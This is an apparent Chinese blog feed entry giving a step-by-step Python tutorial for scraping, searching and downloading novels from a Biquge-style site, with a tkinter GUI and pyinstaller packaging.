    <content type="html"><![CDATA[<p>​用python爬虫制作一个爬取笔趣阁网站小说并且下载的程序，以下是 详细步骤：</p><p>1，先下载该程序所需的库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先到Python的安装目录的Scripts文件夹下，进入cmd命令窗口</span><br><span class="line"># requests库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ requests</span><br><span class="line"># lxml库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ lxml</span><br><span class="line"># urllib库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ urllib</span><br><span class="line"># prettytable库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ prettytable</span><br><span class="line"># pyinstaller 库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ pyinstaller</span><br></pre></td></tr></table></figure><p>2，因为爬虫需要多次请求网站并且获取回复，所以创建novel0.py，先封装一个get请求获取response的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 公共方法</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 输入url用get方法获取response</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_response</span>(<span class="params">url</span>):</span><br><span class="line">    headers=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 SLBrowser/9.0.0.10191 SLBChan/11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;Hm_lvt_dd315b2f7503b4902afb3af0c37c3847=1700455793,1701781492; clickbids=78909; bcolor=; font=; size=; fontcolor=; width=; Hm_lpvt_dd315b2f7503b4902afb3af0c37c3847=1701781516&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>​    headers请求头内含User-Agent，Accept，Cookie三个可以确保请求到网页内容</p><p>3，下载单张小说，创建novel1.py，封装一个输入小说下载地址和小说名称，会保存到本地novels文件夹下为：小说名称.txt文件，其中调用一个方法检查目录下是否有novels文件夹，若没有则进行创建：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载单张小说</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> novel0</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> novel5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_chapters</span>(<span class="params">url,name</span>):</span><br><span class="line">    response=novel0.get_response(url)</span><br><span class="line">    contect=response.text</span><br><span class="line">    <span class="comment"># 检查响应的编码类型</span></span><br><span class="line">    encoding = response.encoding</span><br><span class="line">    <span class="comment"># 如果不是UTF-8，则将内容转换为UTF-8</span></span><br><span class="line">    <span class="keyword">if</span> encoding != <span class="string">&#x27;utf-8&#x27;</span>:</span><br><span class="line">        contect = contect.encode(encoding).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    tree=etree.HTML(contect)</span><br><span class="line">    <span class="comment"># 拿到标题</span></span><br><span class="line">    title=tree.xpath(<span class="string">&#x27;//h1/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;下载&#x27;</span>+title)</span><br><span class="line">    <span class="comment"># 拿到正文内容</span></span><br><span class="line">    content=tree.xpath(<span class="string">&#x27;//div[@id=&quot;content&quot;]/text()&#x27;</span>)</span><br><span class="line">    <span class="comment"># 去掉多余字符，只保留中文文本内容</span></span><br><span class="line">    content=<span class="string">&#x27;\n&#x27;</span>.join([para.strip() <span class="keyword">for</span> para <span class="keyword">in</span> content])</span><br><span class="line">    dir_name=get_novels()</span><br><span class="line">    path=dir_name+<span class="string">&#x27;/novels/&#x27;</span>+name+<span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path,mode=<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(title)</span><br><span class="line">        fp.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        fp.write(content)</span><br><span class="line">        fp.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># 将路径赋值给novel5的某个属性或方法</span></span><br><span class="line">    novel5.path = path</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_novels</span>():</span><br><span class="line">    <span class="comment"># 获取当前文件所在的目录的路径</span></span><br><span class="line">    current_dir = os.path.dirname(__file__)</span><br><span class="line">    <span class="comment"># 获取当前文件夹名称</span></span><br><span class="line">    dir_name = os.path.basename(current_dir)</span><br><span class="line">    <span class="comment"># 检查novels文件夹是否存在</span></span><br><span class="line">    novels_dir = os.path.join(current_dir, <span class="string">&#x27;novels&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(novels_dir):</span><br><span class="line">        <span class="comment"># 如果不存在，创建novels文件夹</span></span><br><span class="line">        os.makedirs(novels_dir)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;创建novels文件夹&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> dir_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用xpath获取小说的章节标题和各章的内容,下载完成后将路径发送给novel5</p><p>4，按照小说目录下载整本小说，创建novel2.py，封装一个输入小说的目录地址，调用novel1中的方法下载各章小说：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按照小说目录下载整本小说</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> novel1</span><br><span class="line"><span class="keyword">import</span> novel0</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_novel</span>(<span class="params">url</span>):   </span><br><span class="line">    <span class="comment"># url=&#x27;http://www.yetianlian.cc/yt78909/&#x27;</span></span><br><span class="line">    response=novel0.get_response(url)</span><br><span class="line">    contect=response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    tree=etree.HTML(contect)</span><br><span class="line">    <span class="comment"># 拿到标题</span></span><br><span class="line">    name=tree.xpath(<span class="string">&#x27;//h2/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 拿到各章地址</span></span><br><span class="line">    url_list=tree.xpath(<span class="string">&#x27;//div[@class=&quot;listmain&quot;]//a/@href&#x27;</span>)</span><br><span class="line">    url_list=url_list[<span class="number">12</span>:]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;下载小说：&#x27;</span>+name)</span><br><span class="line">    <span class="keyword">for</span> base_url <span class="keyword">in</span> url_list:</span><br><span class="line">        url=<span class="string">&#x27;http://www.yetianlian.cc&#x27;</span>+base_url</span><br><span class="line">        novel1.download_chapters(url=url,name=name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用xpath获取小说的名称和各章的地址</p><p>5，搜索功能，创建novel3.py，封装一个获取小说名称，调用网站的搜索接口，返回搜索结果的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索功能</span></span><br><span class="line"><span class="keyword">import</span> novel0</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> prettytable <span class="keyword">as</span> pt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">novel_name</span>):</span><br><span class="line">    url=<span class="string">&#x27;http://www.yetianlian.cc/s.php?ie=utf-8&amp;q=&#x27;</span></span><br><span class="line">    url=url+quote(novel_name)</span><br><span class="line">    response=novel0.get_response(url)</span><br><span class="line">    contect=response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    tree=etree.HTML(contect)</span><br><span class="line">    <span class="comment"># 拿到搜索内容</span></span><br><span class="line">    <span class="comment"># 小说地址</span></span><br><span class="line">    address_list=tree.xpath(<span class="string">&#x27;//h4[@class=&quot;bookname&quot;]/a/@href&#x27;</span>)</span><br><span class="line">    <span class="comment"># 小说名称</span></span><br><span class="line">    names_list=tree.xpath(<span class="string">&#x27;//h4[@class=&quot;bookname&quot;]/a/text()&#x27;</span>)</span><br><span class="line">    <span class="comment"># 小说作者</span></span><br><span class="line">    authors_list=tree.xpath(<span class="string">&#x27;//div[@class=&quot;author&quot;]/text()&#x27;</span>)</span><br><span class="line">    authors_list=[item.replace(<span class="string">&#x27;作者：&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> item <span class="keyword">in</span> authors_list]</span><br><span class="line">    <span class="comment"># 设置列表</span></span><br><span class="line">    novels_info=[]</span><br><span class="line">    <span class="comment"># 创建好看的表格</span></span><br><span class="line">    tb=pt.PrettyTable()</span><br><span class="line">    tb.field_names=[<span class="string">&#x27;序号&#x27;</span>,<span class="string">&#x27;书名&#x27;</span>,<span class="string">&#x27;作者&#x27;</span>,<span class="string">&#x27;下载地址&#x27;</span>]</span><br><span class="line">    num=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(names_list)):</span><br><span class="line">        info=&#123;</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>:names_list[i],</span><br><span class="line">            <span class="string">&#x27;author&#x27;</span>:authors_list[i],</span><br><span class="line">            <span class="string">&#x27;address&#x27;</span>:address_list[i]</span><br><span class="line">        &#125;</span><br><span class="line">        tb.add_row([num,names_list[i],authors_list[i],address_list[i]])</span><br><span class="line">        novels_info.append(info)</span><br><span class="line">    <span class="built_in">print</span>(tb)</span><br><span class="line">    <span class="keyword">return</span> novels_info</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中，用xpath获取网站的搜索结果包括小说的名称，作者和下载地址，prettytable是整齐好看的表格，让结果整齐的在控制台中打印出来</p><p>6，GUI图形化窗口，创建novel4.py，封装一个创建图形化窗口的方法，该窗口中包括两个标签（名称&#x2F;作者，序号）和与之对应的输入框和按钮和一个表格，表格分为序号，书名，作者和下载地址四列：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 图形主页面</span></span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> ttk</span><br><span class="line"><span class="keyword">import</span> novel5</span><br><span class="line"><span class="comment"># 创建窗口</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_window</span>():</span><br><span class="line">    root=tk.Tk()</span><br><span class="line">    <span class="comment"># 设置窗口标题</span></span><br><span class="line">    root.title(<span class="string">&#x27;小说下载器&#x27;</span>)</span><br><span class="line">    <span class="comment"># 设置窗口的大小（长400px，宽300px）</span></span><br><span class="line">    root.geometry(<span class="string">&quot;500x400&quot;</span>)</span><br><span class="line">    <span class="comment"># 获取屏幕的宽度和高度</span></span><br><span class="line">    screen_width = root.winfo_screenwidth()</span><br><span class="line">    screen_height = root.winfo_screenheight()</span><br><span class="line">    <span class="comment"># 计算窗口在屏幕上的位置（居中）</span></span><br><span class="line">    x_pos = <span class="built_in">int</span>((screen_width / <span class="number">2</span>) - (<span class="number">500</span> / <span class="number">2</span>))</span><br><span class="line">    y_pos = <span class="built_in">int</span>((screen_height / <span class="number">2</span>) - (<span class="number">400</span> / <span class="number">2</span>))</span><br><span class="line">    <span class="comment"># 使用geometry()函数设置窗口的位置和大小</span></span><br><span class="line">    root.geometry(<span class="string">&quot;+&#123;&#125;+&#123;&#125;&quot;</span>.<span class="built_in">format</span>(x_pos, y_pos))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个书名的标签</span></span><br><span class="line">    lable_shuming=tk.Frame(root)</span><br><span class="line">    lable_shuming.pack(pady=<span class="number">15</span>,fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    lab_shum=tk.Label(lable_shuming,font=(<span class="string">&#x27;微软雅黑&#x27;</span>,<span class="number">15</span>),text=<span class="string">&#x27;书名/作者&#x27;</span>)</span><br><span class="line">    lab_shum.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 设置书名/作者输入框的变量</span></span><br><span class="line">    name_var=tk.StringVar()</span><br><span class="line">    ent_shuming=tk.Entry(lable_shuming,relief=<span class="string">&#x27;flat&#x27;</span>,textvariable=name_var)</span><br><span class="line">    ent_shuming.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    btn_shuming=tk.Button(lable_shuming,command=<span class="keyword">lambda</span>:novel5.sosuo(name_var,tree_view),text=<span class="string">&#x27;搜索&#x27;</span>,bg=<span class="string">&#x27;#00BFFF&#x27;</span>,fg=<span class="string">&#x27;#FFFFFF&#x27;</span>,width=<span class="number">4</span>,height=<span class="number">1</span>,activebackground=<span class="string">&#x27;#00BFFF&#x27;</span>,activeforeground=<span class="string">&#x27;#00BFFF&#x27;</span>,font=(<span class="string">&#x27;微软雅黑&#x27;</span>,<span class="number">11</span>))</span><br><span class="line">    btn_shuming.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个选择序号的标签</span></span><br><span class="line">    lable_number=tk.Frame(root)</span><br><span class="line">    lable_number.pack(pady=<span class="number">5</span>,fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    lab_num=tk.Label(lable_number,font=(<span class="string">&#x27;微软雅黑&#x27;</span>,<span class="number">15</span>),text=<span class="string">&#x27; 选择序号&#x27;</span>)</span><br><span class="line">    lab_num.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 设置序号输入框的变量</span></span><br><span class="line">    num_var=tk.StringVar()</span><br><span class="line">    ent_number=tk.Entry(lable_number,relief=<span class="string">&#x27;flat&#x27;</span>,textvariable=num_var)</span><br><span class="line">    ent_number.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    btn_number=tk.Button(lable_number,command=<span class="keyword">lambda</span>:novel5.down(num_var,root),text=<span class="string">&#x27;下载&#x27;</span>,bg=<span class="string">&#x27;#00BFFF&#x27;</span>,fg=<span class="string">&#x27;#FFFFFF&#x27;</span>,width=<span class="number">4</span>,height=<span class="number">1</span>,activebackground=<span class="string">&#x27;#00BFFF&#x27;</span>,activeforeground=<span class="string">&#x27;#00BFFF&#x27;</span>,font=(<span class="string">&#x27;微软雅黑&#x27;</span>,<span class="number">11</span>))</span><br><span class="line">    btn_number.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 设置搜索显示表</span></span><br><span class="line">    columns=(<span class="string">&#x27;novle_id&#x27;</span>,<span class="string">&#x27;novle_name&#x27;</span>,<span class="string">&#x27;novle_author&#x27;</span>,<span class="string">&#x27;novle_address&#x27;</span>)</span><br><span class="line">    tree_view=ttk.Treeview(root,height=<span class="number">18</span>,columns=columns,show=<span class="string">&#x27;headings&#x27;</span>)</span><br><span class="line">    <span class="comment"># 设置每列格式</span></span><br><span class="line">    tree_view.column(<span class="string">&#x27;novle_id&#x27;</span>,width=<span class="number">25</span>,anchor=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    tree_view.column(<span class="string">&#x27;novle_name&#x27;</span>,width=<span class="number">55</span>,anchor=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    tree_view.column(<span class="string">&#x27;novle_author&#x27;</span>,width=<span class="number">40</span>,anchor=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    tree_view.column(<span class="string">&#x27;novle_address&#x27;</span>,width=<span class="number">40</span>,anchor=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    <span class="comment"># 设置每列表头</span></span><br><span class="line">    tree_view.heading(<span class="string">&#x27;novle_id&#x27;</span>,text=<span class="string">&#x27;序号&#x27;</span>)</span><br><span class="line">    tree_view.heading(<span class="string">&#x27;novle_name&#x27;</span>,text=<span class="string">&#x27;书名&#x27;</span>)</span><br><span class="line">    tree_view.heading(<span class="string">&#x27;novle_author&#x27;</span>,text=<span class="string">&#x27;作者&#x27;</span>)</span><br><span class="line">    tree_view.heading(<span class="string">&#x27;novle_address&#x27;</span>,text=<span class="string">&#x27;下载地址&#x27;</span>)</span><br><span class="line">    tree_view.pack(side=<span class="string">&#x27;left&#x27;</span>,fill=<span class="string">&#x27;both&#x27;</span>,expand=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>点击按钮后，将输入框的值发送给novel5执行</p><p>7，主方法，创建novel5.py，在该方法中将之前的功能串联起来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 主方法</span></span><br><span class="line"><span class="keyword">import</span> novel4</span><br><span class="line"><span class="keyword">import</span> novel3</span><br><span class="line"><span class="keyword">import</span> novel2</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    path=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    root=novel4.get_window()</span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 点击搜索</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sosuo</span>(<span class="params">name_var,tree_view</span>):</span><br><span class="line">    name=name_var.get()</span><br><span class="line">    <span class="keyword">global</span> novels_info</span><br><span class="line">    novels_info=novel3.search(name)</span><br><span class="line">    <span class="comment"># 插入novels_info中的数据</span></span><br><span class="line">    <span class="keyword">for</span> i, novel_info <span class="keyword">in</span> <span class="built_in">enumerate</span>(novels_info):</span><br><span class="line">        values = [i, novel_info[<span class="string">&#x27;name&#x27;</span>], novel_info[<span class="string">&#x27;author&#x27;</span>], novel_info[<span class="string">&#x27;address&#x27;</span>]]</span><br><span class="line">        tree_view.insert(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;end&#x27;</span>, values=values)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 在主窗口上弹出新窗口</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_new_window</span>(<span class="params">message,root</span>):</span><br><span class="line">    new_window = tk.Toplevel(root)</span><br><span class="line">    new_window.title(<span class="string">&quot;小说下载器&quot;</span>)</span><br><span class="line">    new_window.geometry(<span class="string">&quot;350x100+650+400&quot;</span>)</span><br><span class="line">    label = tk.Label(new_window, text=message)</span><br><span class="line">    label.pack()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 点击下载</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down</span>(<span class="params">num_var,root</span>):</span><br><span class="line">    num=<span class="built_in">int</span>(num_var.get())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> num&lt;<span class="number">0</span> <span class="keyword">or</span> num&gt;<span class="built_in">len</span>(novels_info):</span><br><span class="line">            message=<span class="string">&#x27;输入的序号错误！&#x27;</span></span><br><span class="line">            open_new_window(message,root)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            address = <span class="string">&#x27;http://www.yetianlian.cc&#x27;</span>+novels_info[num][<span class="string">&#x27;address&#x27;</span>]</span><br><span class="line">            novel2.get_novel(address)</span><br><span class="line">            message=<span class="string">&#x27;下载完成！\n 小说下载到：&#x27;</span>+path</span><br><span class="line">            open_new_window(message,root)     </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        message=<span class="string">&#x27;下载失败！&#x27;</span></span><br><span class="line">        open_new_window(message,root)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>8,运行效果</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082114588.png" alt="image-20231208204704551" style="zoom:67%;" /><p>搜索功能：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082115144.png" alt="image-20231208204802038" style="zoom:67%;" /><p>下载功能：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082115654.png" alt="image-20231208205131466" style="zoom:67%;" /><p>下载的文件：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082116465.png" alt="image-20231208205206240"></p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082116076.png" alt="image-20231208205230920" style="zoom:67%;" /><p>9，打包为exe可执行文件<br>cmd 进入项目的文件夹内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -D -w -i box.ico -n &quot;小说下载器&quot; novel5.py</span><br><span class="line">-D表示打包为文件夹</span><br><span class="line">-w表示可在Windows系统中使用</span><br><span class="line">-i box.ico表示选择当前文件夹下的box.ico图片当做程序的图标</span><br><span class="line">-n &quot;小说下载器&quot; 表示程序的名称为：小说下载器</span><br><span class="line">novel5.py该项目的主程序入口</span><br></pre></td></tr></table></figure><p>打包完成为：build,dist两个文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082117103.png" alt="image-20231208205911547"></p><p>其中exe程序就在dist的文件夹下</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082118594.png" alt="image-20231208210019441"></p><p>至此，整个python爬虫的小说下载器项目就制作完成！</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​		用python爬虫制作一个爬取笔趣阁网站小说并且下载的程序，以下是 详细步骤：&lt;/p&gt;
&lt;p&gt;1，先下载该程序所需的库：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十四，Proxifier和Wireshark的使用</title>
    <link href="http://example.com/2023/12/05/%E4%BA%8C%E5%8D%81%E5%9B%9B%EF%BC%8CProxifier%E5%92%8CWireshark%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/12/05/%E4%BA%8C%E5%8D%81%E5%9B%9B%EF%BC%8CProxifier%E5%92%8CWireshark%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2023-12-05T11:23:38.000Z</published>
    <updated>2023-12-05T12:09:31.262Z</updated>
    
